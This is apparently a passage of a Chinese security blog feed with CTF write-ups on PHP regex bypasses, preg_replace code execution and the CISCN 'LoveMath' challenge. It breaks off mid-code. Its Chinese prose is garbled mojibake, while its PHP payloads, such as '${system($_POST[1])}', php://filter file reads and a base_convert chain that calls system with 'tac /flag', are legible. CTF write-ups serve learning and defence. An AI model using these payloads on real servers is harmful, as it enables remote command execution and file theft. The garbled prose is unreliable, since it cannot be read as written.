<code>shell.php\n</code>ï¼Œä»ç„¶å¯ä»¥è®©Apacheè§£æphpæ–‡ä»¶</p><p>é‚£ä¹ˆè¯¥å¦‚ä½•è§£å†³è¿™ç§é—®é¢˜å‘¢ï¼Ÿ</p><p>åœ¨phpä¸­æœ‰ä¸€ä¸ªä¿®é¥°ç¬¦<code>D</code>ï¼Œ<code>D</code>æ˜¯phpä¸­ç‹¬æœ‰çš„ä¿®é¥°ç¬¦ï¼Œå…¶ä½œç”¨æ˜¯å‘Šè¯‰å¼•æ“<code>$</code>ä»…åŒ¹é…æ–‡æœ¬ç»“å°¾ï¼Œä¸å†åŒ¹é…åˆ°ä¸€ä¸ªæ¢è¡Œç¬¦ï¼Œåœ¨phpä¸­å¯ä»¥ç”¨<code>D</code>ä¿®é¥°ç¬¦æ¥è§£å†³é—®é¢˜ï¼Œé‚£ä¹ˆä¸åœ¨phpç¯å¢ƒä¸‹å‘¢ï¼Ÿåœ¨æ­¤ä¹‹å‰å°±éœ€è¦å±¡ä¸€ä¸‹æ­£åˆ™ä¸­å…·æœ‰â€œé¦–å°¾â€ç•Œå®šç¬¦æ„æ€çš„å­—ç¬¦ï¼š</p><ul><li><code>^</code></li><li><code>$</code></li><li><code>\A</code></li><li><code>\Z</code></li><li><code>\z</code></li></ul><p>ç¬¬ä¸‰ä¸ª<code>\A</code>è¡¨ç¤ºâ€œå­—ç¬¦ä¸²çš„å¼€å¤´â€ï¼Œç¬¬å››ä¸ª<code>\Z</code>è¡¨ç¤ºè¡Œçš„ç»“å°¾ï¼Œå…¶æ•ˆæœå…¶å®å’Œ<code>$</code>å®Œå…¨ä¸€æ ·ï¼Œç¬¬äº”ä¸ª<code>\z</code>ï¼Œè¡¨ç¤ºâ€œå­—ç¬¦ä¸²çš„ç»“å°¾â€ï¼Œæ‰€ä»¥<code>\A</code>å’Œ<code>\z</code>è¿™ä¸¤ä¸ªç•Œå®šç¬¦æ‰æ˜¯çœŸæ­£è¡¨ç¤ºâ€œå­—ç¬¦ä¸²å¼€å¤´â€å’Œâ€œå­—ç¬¦ä¸²ç»“å°¾â€çš„ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520170351144.png" alt loading="lazy"></p><h3 id="æ­£åˆ™æ›¿æ¢"><a href="#æ­£åˆ™æ›¿æ¢" class="headerlink" title="æ­£åˆ™æ›¿æ¢"></a><strong>æ­£åˆ™æ›¿æ¢</strong></h3><p>åˆ©ç”¨<code>$0</code>æ¥è¿›è¡Œæ­£åˆ™æ›¿æ¢ä½¿ç¬¦å·é€ƒé€¸</p><p>æœ‰å¦‚ä¸‹ä»£ç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$api</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'api'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./option.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\$API = '.*';/s"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\$API = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$api</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./option.php'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>æˆ‘ä»¬å¯ä»¥å¯¹<code>option.php</code>è¿›è¡Œå†™æ“ä½œï¼Œä¸‹é¢çœ‹å¦‚ä½•åˆ©ç”¨<code>$0</code>æ¥ç»•è¿‡è¿™ä¸ªæ­£åˆ™çš„é™åˆ¶</p><p>ä¼ å…¥<code>?api=;phpinfo();</code>ï¼Œ<code>option.php</code>ä¸­çš„å†…å®¹å˜æˆäº†</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$API</span> <span class="token operator">=</span> <span class="token string single-quoted-string">';phpinfo();'</span><span class="token punctuation">;</span></span></code></pre><p>å†ä¼ å…¥<code>?api=$0</code>ï¼Œ<code>option.php</code>ä¸­çš„å†…å®¹å˜æˆäº†</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$API</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'$API = '</span><span class="token punctuation">;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">;</span></span></code></pre><p>æˆåŠŸä½¿å¾—å•å¼•å·é€ƒé€¸ï¼Œé€ æˆä»£ç æ‰§è¡Œï¼Œ$0ç­‰çš„ä½¿ç”¨æ–¹æ³•ï¼š</p><ul><li><code>$1</code>è¡¨ç¤ºæ•è·ç»„1ï¼Œ<code>$0</code>è¡¨ç¤ºæ•´ä¸ªåŒ¹é…ç»„ã€‚</li><li>å¦‚æœ<code>$1</code>åé¢ç´§æ¥ä¸€ä¸ªæ•°å­—ï¼Œåˆ™éœ€è¦å†™æˆ<code>\$&#123;1&#125;</code>çš„å½¢å¼ã€‚</li></ul><p>å†æ¥çœ‹çœ‹<code>preg_replace</code>çš„å…·ä½“ä½¿ç”¨æ–¹æ³•</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/phpæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¿®é¥°ç¬¦/image-20200520192912940.png" style="zoom: 80%;" loading="lazy"><h3 id="å·¨äººçš„è‚©è†€"><a href="#å·¨äººçš„è‚©è†€" class="headerlink" title="å·¨äººçš„è‚©è†€"></a><strong>å·¨äººçš„è‚©è†€</strong></h3><ul><li><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html">ç»å…¸å†™é…ç½®æ¼æ´ä¸å‡ ç§å˜å½¢</a></li><li><a href="https://www.smi1e.top/%e5%b0%8f%e5%af%86%e5%9c%88%e7%bb%8f%e5%85%b8%e5%86%99%e9%85%8d%e7%bd%ae%e6%bc%8f%e6%b4%9e%e4%b8%8e%e5%87%a0%e7%a7%8d%e5%8f%98%e5%bd%a2%e5%ad%a6%e4%b9%a0/">[å°å¯†åœˆ]ç»å…¸å†™é…ç½®æ¼æ´ä¸å‡ ç§å˜å½¢å­¦ä¹ </a></li><li><a href="https://xz.aliyun.com/t/2557">æ·±å…¥ç ”ç©¶preg_replaceä¸ä»£ç æ‰§è¡Œ</a></li><li><a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php">PHPæ¨¡å¼ä¿®é¥°ç¬¦</a></li></ul><h3 id="æ —å­"><a href="#æ —å­" class="headerlink" title="æ —å­"></a><em>æ —å­</em></h3><h4 id="BJDCTF2020-ZJCTFâ€”ä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFâ€”ä¸è¿‡å¦‚æ­¤" class="headerlink" title="BJDCTF2020-ZJCTFâ€”ä¸è¿‡å¦‚æ­¤"></a><strong>BJDCTF2020-ZJCTFâ€”ä¸è¿‡å¦‚æ­¤</strong></h4><p>é¦–å…ˆé¢˜ç›®å…ˆç»™å‡ºäº†ä¸€æ®µä»£ç ï¼š</p><pre class="language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phperror_reporting(0);$text &#x3D; $_GET[&quot;text&quot;];$file &#x3D; $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;I have a dream&quot;))&#123;    echo (file_get_contents($text,&#39;r&#39;));    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;        die(&quot;Not now!&quot;);    &#125;    include($file);  &#x2F;&#x2F;next.php    &#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p>æ„é€ <code>payload</code>è¯»å–<code>next.php</code>çš„å†…å®¹</p><pre class="language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//e4d6525b-eb85-41c7-9bbb-f48802a4eb3a.node3.buuoj.cn</span><span class="token operator">?</span>text<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain;base64,SSBoYXZlIGEgZHJlYW0=</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=next.php</span></code></pre><p>å°†è¯»åˆ°çš„base64è§£ç å¾—åˆ°<code>next.php</code>æ–‡ä»¶çš„å†…å®¹</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>        <span class="token string single-quoted-string">'/('</span> <span class="token operator">.</span> <span class="token variable">$re</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span>        <span class="token variable">$str</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>çœ‹åˆ°äº†<code>complex</code>æ–¹æ³•ä¸­çš„<code>preg_replace</code>å‡½æ•°ï¼Œé‡Œé¢çš„æ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨äº†<code>e</code>ä¿®é¥°ç¬¦ï¼Œåˆ©ç”¨ä¸Šé¢çš„åŸç†æ„é€ ï¼š</p><p><code>payload</code>ï¼š<code>?\S*=$&#123;system($_POST[1])&#125;</code>   POST:<code>1=cat /flag;</code>å³å¯æ‹¿åˆ°<code>flag</code>ï¼Œ</p><p>ä¹Ÿå¯ä»¥åˆ©ç”¨é‡Œé¢çš„<code>getFlag</code>æ–¹æ³•<code>?\S*=&#123;$&#123;getFlag()&#125;&#125;&amp;cmd=highlight_file(&#39;/flag&#39;);</code>ä¹Ÿå¯ä»¥æ‹¿åˆ°<code>flag</code></p>]]></content>
      
      
      <categories>
          
          <category> å¤‡å¿˜å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> æ­£åˆ™ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN-LoveMath-phpåŠ¨æ€å‡½æ•°æ‰§è¡Œ</title>
      <link href="posts/a649e496/"/>
      <url>posts/a649e496/</url>
      
        <content type="html"><![CDATA[<p>  å…ˆçœ‹åˆ°é¢˜ç›®ç»™å‡ºçš„æºç ï¼š</p><span id="more"></span><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token comment">//ä¾‹å­ c=20-1</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">80</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å¤ªé•¿äº†ä¸ä¼šç®—"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span>    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'abs'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan2'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atanh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'base_convert'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bindec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ceil'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decbin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'dechex'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decoct'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'expm1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'floor'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fmod'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hypot'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log10'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log1p'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'max'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'min'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'octdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pi'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pow'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'round'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$used_funcs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$used_funcs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>ä»£ç å®¡è®¡é™åˆ¶æ¡ä»¶</p><ul><li>ä¼ å…¥çš„<code>c</code>çš„å­—ç¬¦ä¸²é•¿åº¦å¤§å°ä¸èƒ½å¤§äº80</li><li>ä¼ å…¥çš„å­—ç¬¦ä¸²ä¸èƒ½åŒ…å«<code>&#39; &#39;</code>, <code>&#39;\t&#39;</code>, <code>&#39;\r&#39;</code>, <code>&#39;\n&#39;</code>,<code>&#39;\&#39;&#39;</code>, <code>&#39;&quot;&#39;</code>, <code>&#39;``&#39;</code>, <code>&#39;\[&#39;</code>, <code>&#39;\]&#39;</code></li><li><code>preg_match_all</code>å°†åŒ¹é…åˆ°çš„ç»“æœä¼ ç»™<code>$used_funcs</code>ï¼Œ<code>$used_funcs</code>åªèƒ½æ˜¯<code>$whitelist</code>ä¸­çš„å‡½æ•°ï¼Œæ„è¯†å°±æ˜¯ä¼ å…¥çš„å­—ç¬¦ä¸²ä¸­çš„è¯ç»„ä¹Ÿåªèƒ½æ˜¯<code>$whitelist</code>ä¸­çš„å•è¯</li></ul><p>ä»¥ä¸Šæ¡ä»¶æ»¡è¶³åå³å¯ä¼ å…¥<code>eval</code>ä¸­æ‰§è¡Œä»£ç </p><h3 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token variable">$pi</span><span class="token operator">=</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">3761671484</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">1598506324</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>system<span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">=</span>tac <span class="token operator">/</span>flag</code></pre><p>åˆ†æï¼š</p><ul><li><code>base_convert</code>å‡½æ•°çš„åŠŸèƒ½æ˜¯åœ¨ä»»æ„è¿›åˆ¶çš„å­—ç¬¦ä¸²ä¹‹é—´è½¬æ¢æ•°å­—<code>base_convert(37907361743,10,36)  ==&gt;  hex2bin</code></li><li><code>dechex(1598506324)  ==&gt;  5f474554</code>ï¼Œ<code>hex2bin(&quot;5f474554&quot;)  ==&gt;  _GET</code></li><li>é€‰ç”¨<code>pi</code>çš„åŸå› æ˜¯å› ä¸ºé¢˜ç›®æœ‰é•¿åº¦é™åˆ¶ï¼Œç™½åå•ä¸­æœ€çŸ­çš„å°±æ˜¯è¿™ä¸¤ä¸ªå­—ç¬¦<code>pi</code>ï¼Œæ•…é€‰å®ƒ</li><li>å½“<code>$pi</code>=<code>_GET</code>ä¹‹åå†åœ¨å‰é¢åŠ ä¸€ä¸ª<code>$</code>å°±å½¢æˆäº†<code>$_GET</code></li><li><code>($$pi)&#123;1&#125;(($$pi)&#123;2&#125;)</code>ç¿»è¯‘è¿‡æ¥å°±æ˜¯<code>($_GET)&#123;1&#125;(($_GET)&#123;2&#125;) === $_GET[1]($_GET[2])</code>ï¼Œä¼ å…¥<code>1=system</code>å³å¯è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</li></ul><p>ä¸¾ä¸€åä¸‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ”¹å¦‚ä½•æ„é€ å‡ºè¿™ç§æ–¹æ³•å‘¢ï¼Ÿ<code>base_convert</code>çš„è¿›åˆ¶è½¬æ¢ä¸çŸ¥é“çš„è¯åˆæ€ä¹ˆçŸ¥é“è¯¥ä¼ å…¥ä»€ä¹ˆæ•°å­—å’Œè¿›åˆ¶å‘¢ï¼Ÿäºæ˜¯å†™å‡ºæ„é€ è„šæœ¬ï¼š</p><p><code>base_convert</code>å‡½æ•°æ„é€ ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'hex2bin'</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">37</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token number">37</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'len='</span><span class="token operator">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token operator">.</span><span class="token string single-quoted-string">'base_convertå‚æ•°->'</span><span class="token operator">.</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token operator">.</span><span class="token variable">$j</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token operator">.</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>è¿™æ ·å³å¯å¾—åˆ°æ‰€æœ‰çš„è¿›åˆ¶è½¬æ¢ç»“æœï¼Œå½“ç„¶å¦‚æœé¢˜ç›®æ²¡æœ‰å¼•å·é™åˆ¶ï¼Œ<code>is_numeric</code>å‡½æ•°ä¹Ÿå¯ä»¥å»æ‰ï¼Œåœ¨é‡Œé¢é€‰å–æ‰€éœ€è¦çš„å³å¯</p><p>é‚£ä¹ˆ<code>dechex</code>å¦‚ä½•æ„é€ å‘¢ï¼Ÿè¿™ä¸ªå°±ç®€å•äº†ï¼Œä¸¤è¡Œä»£ç å°±å¯ä»¥æå®š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"_GET"</span><span class="token punctuation">;</span><span class="token variable">$num</span> <span class="token operator">=</span> <span class="token 